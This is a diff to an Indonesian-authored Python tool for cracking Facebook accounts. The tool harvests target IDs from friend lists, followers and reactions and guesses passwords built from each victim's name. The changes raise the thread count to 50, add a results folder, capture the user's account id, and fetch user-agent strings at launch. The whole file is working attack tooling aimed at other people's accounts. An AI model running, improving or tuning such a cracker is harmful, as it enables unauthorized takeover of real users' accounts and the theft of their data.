@@ -2,7 +2,6 @@
 # coded by angga kurniawan
 # fb.me/gaaaarzxd
 # instagram.com/gaaarzxd
-# open source, tidak di perjual belikan
 
 try:
 	import requests
@@ -13,7 +12,6 @@ try:
 	import time
 	import re
 	import json
-	import uuid
 	from multiprocessing.pool import ThreadPool
 	from requests.exceptions import ConnectionError
 	from datetime import datetime
@@ -29,7 +27,7 @@ pwx = []
 
 s = requests.Session()
 rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
-ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
+ua = open('.ua', 'r').read()
 ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 	
 ct = datetime.now()
@@ -153,6 +151,7 @@ def menu():
 		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
 		a = json.loads(otw.text)
 		nama = a['name']
+		id = a['id']
 	except KeyError:
 		os.system('clear')
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
@@ -247,6 +246,8 @@ def public():
 		sys.stdout.write(
 		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
+		try:os.mkdir("results")
+		except OSError:pass
 		uid,name=user.split("<=>")
 		for ss in name.split(" "):
 			if len(ss)<3:
@@ -299,7 +300,7 @@ def public():
 			loop += 1
 		except:
 			pass
-	p = ThreadPool(30)
+	p = ThreadPool(50)
 	p.map(main, id)
 	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
 
@@ -337,6 +338,8 @@ def followers():
 		sys.stdout.write(
 		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
+		try:os.mkdir("results")
+		except OSError:pass
 		uid,name=user.split("<=>")
 		for ss in name.split(" "):
 			if len(ss)<3:
@@ -427,6 +430,8 @@ def reaction():
 		sys.stdout.write(
 		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
+		try:os.mkdir("results")
+		except OSError:pass
 		uid,name=user.split("<=>")
 		for ss in name.split(" "):
 			if len(ss)<3:
@@ -496,6 +501,8 @@ def manual():
 		global loop, token
 		sys.stdout.write('\r \033[0;97m[\033[0;93m*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
+		try:os.mkdir("results")
+		except OSError:pass
 		uid,name=user.split("<=>")
 		ss = name.split(" ")
 		try:
@@ -540,7 +547,7 @@ def manual():
 			loop += 1
 		except:
 			pass
-	p = ThreadPool(20)
+	p = ThreadPool(50)
 	p.map(main, id)
 	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
 	
@@ -553,9 +560,9 @@ def settua():
 		try:
 			print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type In Chrome Search : My User Agent")
 			ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] User Agent : ") 
-			uas = open(".ua","w")
-			uas.write(ua) 
-			uas.close()
+			save = open(".ua","w")
+			save.write(ua) 
+			save.close()
 			print(" \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
 			time.sleep(2)
 			menu()
@@ -564,9 +571,9 @@ def settua():
 	elif ask == "t" or ask == "T":
 		try:
 			ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
-			uas = open(".ua","w")
-			uas.write(ua) 
-			uas.close()
+			save = open(".ua","w")
+			save.write(ua) 
+			save.close()
 			print("\n \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
 			time.sleep(2)
 			menu()
@@ -574,8 +581,15 @@ def settua():
 			exit()
 	else:
 		menu()
-		
+
 if __name__ == '__main__':
+	try:
+		ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
+		save = open(".ua","w")
+		save.write(ua) 
+		save.close()
+	except requests.exceptions.ConnectionError:
+		exit(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
 	if sys.version[0]!="3":
 		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
 	else:
